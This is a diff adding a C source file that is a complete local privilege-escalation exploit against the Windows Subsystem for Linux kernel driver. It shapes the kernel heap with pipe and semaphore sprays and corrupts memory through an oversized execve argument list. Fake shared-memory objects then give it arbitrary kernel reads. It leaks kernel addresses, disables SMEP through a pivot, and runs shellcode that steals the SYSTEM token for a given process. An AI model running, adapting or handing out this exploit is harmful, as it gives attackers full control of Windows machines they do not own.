@@ -1,0 +1,450 @@
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/ipc.h> 
+#include <sys/sem.h>
+#include <sys/shm.h>
+
+#define RING_SIZE				0x2000000
+#define PIPE_SIZE				0xb8
+#define PTR_SIZE				0x8
+#define STR_HDR_SIZE			0x18
+
+#define LEAK_OFFSET				0x68
+#define SHELLCODE_OFFSET		0x200
+#define CHUNK_LVXF_OFFSET		0x138f4296
+#define CR4_VAL_ADDR			0x506f8
+#define MAGIC_KEY				0xefef
+#define NT_OFFSET_TO_PIVOT		0x288005
+
+size_t curr_key 				= 0;
+
+char SHELLCODE[] = {
+	//0xcc,
+	0x90, 															// CLI
+	0x90, 															// PUSHFQ
+	0x48, 0xb8, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RAX, Original Pointer
+	0x50, 															// PUSH RAX
+	0x51, 															// PUSH RCX
+	0x90, 0x90, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RCX, [OverwriteAddr+OverwriteOffset]
+	0x90, 0x90, 0x90,  												// MOV    QWORD PTR [RCX], RAX
+	0xb9, 0xfc, 0x11, 0x00, 0x00,  									// MOV ECX, PID
+
+	0x53, 															// PUSH RBX
+
+	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  			// MOV    RAX,QWORD PTR gs:0x188
+	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,						// MOV    RAX,QWORD PTR [RAX+0xb8] EPROCESS
+	0x48, 0x8d, 0x80, 0xe8, 0x02, 0x00, 0x00,						// LEA    RAX,[RAX+0xActiveProcessLinkOffset] 
+
+	//<tag>
+	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
+	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-8] // UniqueProcessID
+	0x48, 0x83, 0xfb, 0x04,											// CMP    RBX,0x4
+	0x75, 0xf3,														// JNE    <tag>
+	0x48, 0x8b, 0x58, 0x70,											// MOV    RBX, QWORD PTR [RAX+0x70] // GET TOKEN of SYSTEM
+	0x90, 0x90, 0x90,
+	0x53, 															// PUSH RBX
+	//<tag2>
+	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
+	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-8] // UniqueProcessID
+	0x39, 0xcb,														// CMP    EBX, ECX // our PID
+	0x75, 0xf5,														// JNE    <tag2>
+	0x5b, 															// POP RBX
+	0x48, 0x89, 0x58, 0x70,											// MOV    QWORD PTR[RAX +0x70], RBX
+	0x90, 0x90, 0x90,
+
+	0x5b, 															// POP RBX
+	0x59, 															// POP RCX
+	0x58, 															// POP RAX
+	0x90, 															// POPFQ
+
+	0xc3  															// RET
+};
+
+int calc_stop_idx(size_t alloc_size, size_t factor);
+int get_size_factor(size_t spray_size, size_t *factor);
+int trigger_corruption(int spray_size);
+int call_LxpUtilReadUserStringSet(size_t argc, size_t innerSize, char pattern, size_t stopIdx);
+int spray(size_t count);
+int alloc_sem(size_t factor);
+int free_sem(int key);
+char *get_faked_shm();
+void initialize_fake_obj(char *obj, char *shellcode_ptr, char *read_addr, size_t fake_shmid, size_t pid);
+void trigger_shm(size_t shmid);
+void print_shm(struct shmid_ds *buf);
+void *absolute_read(void* obj, size_t shmid, void *addr);
+int alloc_shm(size_t key);
+int shape(size_t *spray_size);
+
+int calc_stop_idx(size_t alloc_size, size_t factor) {
+	size_t totalStringsLength, headersLength;
+
+	totalStringsLength = (factor - 1) * 2 + 0xd001;
+	headersLength = (factor * STR_HDR_SIZE) % (0x100000000);
+
+	return (alloc_size + 496 + 0xc000) / STR_HDR_SIZE;
+}
+
+int get_size_factor(size_t spray_size, size_t *factor) {
+	if (spray_size != 0x2000000) {
+		printf("SPRAY_SIZE ISSUE\n");
+		exit(1);
+	}
+
+	*factor = 0xab13aff - 0x800*2;
+	return 0x15fffdfc;
+}
+
+int trigger_corruption(int spray_size) {
+	size_t factor = 0, alloc_size, stopIdx;
+	int ret;
+	alloc_size = get_size_factor(spray_size, &factor);
+	if (alloc_size < 0) {
+		printf("[*err*] unsupported spray_size == 0x%x", spray_size);
+		return -1;
+	}
+
+	stopIdx = calc_stop_idx(alloc_size, factor);
+
+	ret = call_LxpUtilReadUserStringSet(factor + 1, 1, 'O', stopIdx);
+	printf("[*] trigger_corruption() returned 0x%x\n", ret);
+	return 0;
+}
+
+int call_LxpUtilReadUserStringSet(size_t argc, size_t innerSize, char pattern, size_t stopIdx) {
+	char **argv, *innerBuf, *stopInnerBuf = NULL;
+	size_t pid;
+
+	argv = (char*)mmap(NULL, argc * sizeof(char*), PROT_READ | PROT_WRITE, 
+                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	if(!argv) {
+		perror("[*err*] malloc argv failed\n"); 
+		return -1;
+	}
+
+	innerBuf = (char*)malloc(innerSize); 
+	if (!innerBuf) {
+		printf("[*err*] malloc innerBuf failed\n");
+		return -1;
+	}
+	memset(innerBuf, pattern, innerSize);
+
+	for(size_t i = 0; i < argc - 1; ++i) {
+		argv[i] = innerBuf;
+	}
+	argv[argc-1] = NULL;
+
+	pid = fork();
+	if (pid) {
+		// parent
+		if(stopIdx > 0) {
+			sleep(1.5);
+			printf("[*] set stopIdx, stopping wildcopy\n");
+			argv[stopIdx] = NULL;
+		}
+		return 0;
+	} else {
+		// son
+		argv[stopIdx - 1] = (char*)malloc(0xe000);
+		memset(argv[stopIdx - 1], "X", 0xd000-1);
+		argv[stopIdx - 1][0xd000-1] = '\0';
+
+		argv[stopIdx - 7] = (char*)malloc(0xe000);
+		memset(argv[stopIdx - 7], "X", 0xd000-1);
+		argv[stopIdx - 7][0xd000-1] = '\0';
+
+		// this execve is on nonsense "program", so it will return err.
+		// Just kill the thread.
+		execve(argv[0], argv, NULL);
+		exit(1);
+	}
+}
+
+/*
+	spray <count> chunks, and return number of total bytes allocated
+*/
+int spray(size_t count) {
+	int exec[2];
+	int pipe_capacity = 0, ret = 0;
+
+	for (size_t i = 0; i < count; ++i) {
+		if (pipe(exec) < 0) {
+			printf("[*err*] pipe\n");
+			ret = -1;
+			goto cleanup;
+		}		
+
+		pipe_capacity = fcntl(exec[1], F_SETPIPE_SZ, RING_SIZE);
+		if(pipe_capacity < 0) {
+			printf("[*err*] fcntl return neg capacity\n");
+			ret = -1;
+			goto cleanup;
+		}
+
+		ret += pipe_capacity;
+	}
+
+cleanup:
+	return ret;
+}
+
+/*
+	allocate 12 * v_nsems + 176
+*/
+int alloc_sem(size_t factor) {
+	int semid;
+  	int nsems = factor;
+
+  	semid = semget(curr_key++, nsems, IPC_CREAT | 0666);
+  	if(semid == -1) {
+  		printf("[*err*]semget failed, errno == 0x%x\n", errno);
+  		return -1;
+  	}
+
+	return semid;
+}
+
+int free_sem(int key) {
+	if(semctl(key, 0, IPC_RMID, 0) == -1) {
+		printf("[*err*] semctl failed, errno == 0x%x\n", errno);
+		return -1;
+    }
+    return 0;
+}
+
+char *get_faked_shm() {
+	size_t shellcode_length = 0;
+	char *obj = (char*)mmap(0xc000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC,
+					MAP_SHARED | MAP_ANONYMOUS, -1, 0x0);
+	char *shellcode_ptr;
+
+	if (obj == (void*)-1) {
+		printf("[*err*] mmap failed\n");
+		return NULL;
+	}
+	char *cr4_addr = (char*)mmap(CR4_VAL_ADDR & ~0xfff, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC,
+					MAP_SHARED | MAP_ANONYMOUS, -1, 0x0);
+	if (cr4_addr == (void*)-1) {
+		printf("[*err*] mmap failed\n");
+		return NULL;
+	}
+	memset(cr4_addr, 0x0, 0x10000);
+
+	printf("[*] mmap userspace addr %p, set faked shm object\n", obj);
+
+	obj += 0x1000;
+	shellcode_ptr = obj + 0x200;
+	initialize_fake_obj(obj, shellcode_ptr, NULL, 0x41414141, -1);
+	return obj;
+}
+
+void initialize_fake_obj(char *obj, char *shellcode_ptr, char *read_addr, size_t fake_shmid, size_t pid) {
+	size_t val = 0x4141414141414141, val2 = 7, val3 = CR4_VAL_ADDR;
+	char *obj2 = obj+0x1000;
+
+	memset(obj - 0x100, 0x0, 0x1000);
+
+	memcpy(obj, &read_addr, sizeof(size_t));
+	memcpy((obj+0x10), &val, sizeof(size_t));
+
+	memcpy(obj - 0x20, &val2, sizeof(size_t));
+	memcpy(obj - 0x68, &obj, sizeof(char*));
+	memcpy(obj + 0x28, &shellcode_ptr, sizeof(char*));
+	memcpy(obj - 0x80, &obj, sizeof(char*));
+	memcpy((obj + 0x40), &val, sizeof(size_t));
+
+	memcpy(CR4_VAL_ADDR + 0x10, &fake_shmid, sizeof(size_t));
+	memcpy(CR4_VAL_ADDR - 0x20, &val2, sizeof(size_t));
+	memcpy(CR4_VAL_ADDR - 0x80, &val3, sizeof(char*));
+	memcpy(CR4_VAL_ADDR - 0x68, &val3, sizeof(char*));
+	memcpy(CR4_VAL_ADDR + 0x28, &shellcode_ptr, sizeof(char*));
+	memcpy((CR4_VAL_ADDR + 0x40), &val, sizeof(size_t));
+
+	memcpy(CR4_VAL_ADDR + 0x18, &val2, sizeof(size_t));						// refcount
+	memcpy((CR4_VAL_ADDR + 0x50), &obj2, sizeof(size_t));
+	memcpy((CR4_VAL_ADDR + 0x90), &val3, sizeof(size_t));
+
+	memcpy(obj + SHELLCODE_OFFSET, SHELLCODE, sizeof(SHELLCODE));
+	memcpy(obj + SHELLCODE_OFFSET + 28, &pid, 4);
+}
+
+void trigger_shm(size_t shmid) {
+	char *data;
+	data = shmat(shmid, (void*)0, 0);
+}
+
+void print_shm(struct shmid_ds *buf) {
+	printf ("\nThe USER ID = %p\n", buf->shm_perm.uid);
+	printf ("The GROUP ID = %p\n", buf->shm_perm.gid);
+	printf ("The creator's ID = %p\n", buf->shm_perm.cuid);
+	printf ("The creator's group ID = %p\n", buf->shm_perm.cgid);
+	printf ("The operation permissions = 0%o\n", buf->shm_perm.mode);
+	printf ("The slot usage sequence\n");
+	//printf ("number = 0%x\n", buf->shm_perm.seq);
+	//printf ("The key= 0%x\n", buf->shm_perm.key);
+	printf ("The segment size = %p\n", buf->shm_segsz);
+	printf ("The pid of last shmop = %p\n", buf->shm_lpid);
+	printf ("The pid of creator = %p\n", buf->shm_cpid);
+	printf ("The current # attached = %p\n", buf->shm_nattch);
+	printf("The last shmat time = %p\n", buf->shm_atime);
+	printf("The last shmdt time = %p\n", buf->shm_dtime);
+	printf("The last change time = %p\n", buf->shm_ctime);
+}
+
+void *absolute_read(void* obj, size_t shmid, void *addr) {
+	struct shmid_ds shm;
+	initialize_fake_obj(obj, obj + SHELLCODE_OFFSET, addr, shmid, -1);
+	shmctl(shmid, IPC_STAT, &shm);
+	return (void*)shm.shm_ctime;
+}
+
+int alloc_shm(size_t key) {
+	int shmid;
+	shmid = shmget(key, 1024, 0644 | IPC_CREAT);
+	return shmid;
+}
+
+int shape(size_t *spray_size) {
+	size_t keys[0x400];
+	int exec[2];
+	int sv[2];
+    char flag;
+
+	size_t bytes = 0, tofree = 0;
+	size_t factor,hole_size;
+	struct flock fl;
+	memset(&fl, 0, sizeof(fl));
+	pid_t pid, wpid;
+	int status;
+
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == -1) {
+		printf("[*err] socketpair failed\n");
+		return 1;
+	}
+
+	bytes = spray(1);
+	if (bytes == (size_t)-1) {
+		printf("[*err*] bytes < 0, are you root?\n");
+		return 1;
+	}
+
+	*spray_size = bytes;
+	hole_size = get_size_factor(*spray_size, &factor);
+
+	tofree = hole_size / (bytes / 1) + 1;
+
+	printf("[*] allocate holes before the workspace\n");
+	for (int i = 0; i < 0x400; ++i) {
+		keys[i] = alloc_sem(0x7000);
+	}
+	for (int i = 0; i < 0x20; ++i) {
+		alloc_sem(0x7000);
+	}
+	for (int i = 0; i < 0x2000; ++i) {
+		alloc_sem(4063);
+	}
+	for (int i = 0; i < 0x2000; ++i) {
+		alloc_sem(3);
+	}
+
+	pid = fork();
+	if (pid > 0) {
+		printf("[*] alloc 0xc pages groups, adjust to continuous allocations\n");
+		bytes = spray(5);
+		write(sv[1], "p", 1);
+		read(sv[1], &flag, 1);
+	} else {
+		// son
+		read(sv[0], &flag, 1);
+		printf("[*] alloc workspace pages\n");
+		bytes = spray(tofree);
+		printf("[*] finish allocate workspace allocations\n");
+		write(sv[0], "p", 1);
+	}
+
+	if (pid > 0) {
+		printf("[*] allocating (0xc - shm | shm) AFTER the workspace\n");
+		for (int i = 0; i < 0x100; ++i) {
+			alloc_sem(4061);
+			for (int j = 0; j < 0x5; ++j) {	
+				alloc_shm(i * 0x100 + j);
+			}
+		}
+		write(sv[1], "p", 1);
+	} else {
+		read(sv[0], &flag, 1);
+		printf("[*] free middle allocation, creating workspace freed\n");
+		exit(1);
+	}
+
+	while ((wpid = wait(&status)) > 0); 
+
+	printf("[*] free prepared holes, create little pages holes before the workspace\n");
+	for (int i = 0; i < 0x400; ++i) {
+		free_sem(keys[i]);
+	}
+	
+	return 0;
+}
+
+int main(int argc, char **argv) {
+	size_t spray_size = 0;
+	char *obj;
+	void *paged_pool_addr, *file_obj, *lxcore_addr, *nt_c_specific_handler;
+	void *nt_addr;
+
+	obj = get_faked_shm();
+
+	printf("[*] start shaping\n");
+	if (shape(&spray_size)) {
+		printf("[*err*] shape failed, exit\n");
+		return 1;
+	}
+
+	// if there is some shm with shmid==0, delete it
+	shmctl(0, IPC_RMID, NULL);
+
+	printf("[*] shape is done\n");
+	if (trigger_corruption(spray_size) < 0) {
+		printf("[*err*] internal error\n");
+		return 1;
+	}
+
+	sleep(8);
+
+	printf("[*] leak shm, with the corrupted shmid\n");
+	paged_pool_addr = absolute_read(obj, 1, NULL);
+
+	printf("[*] infoleak - PagedPool addr at %p\n", paged_pool_addr);
+	file_obj = absolute_read(obj, 0xffff, paged_pool_addr + CHUNK_LVXF_OFFSET - LEAK_OFFSET);
+	printf("[*] infoleak - fileObj addr at %p\n", file_obj);
+	lxcore_addr = absolute_read(obj, 0, file_obj - 0x68 - LEAK_OFFSET);
+	printf("[*] infoleak - lxcore!LxpSharedSectionFileType addr at %p\n", lxcore_addr);
+	nt_c_specific_handler = absolute_read(obj, 0, lxcore_addr + 0x8b90 - LEAK_OFFSET);
+	printf("[*] infoleak - nt!_C_specific_handler addr at %p\n", nt_c_specific_handler);
+
+	printf("[*] call nt pivot, disable SMEP\n");
+	initialize_fake_obj(obj, nt_c_specific_handler + NT_OFFSET_TO_PIVOT, CR4_VAL_ADDR, MAGIC_KEY, -1);
+	trigger_shm(MAGIC_KEY);
+
+	sleep(5);
+
+	printf("[*] jump to shellcode!\n");
+	initialize_fake_obj(obj, obj+0x200, CR4_VAL_ADDR, MAGIC_KEY, atoi(argv[1]));
+	trigger_shm(MAGIC_KEY);
+
+	sleep(2);
+
+	return 0;
+}
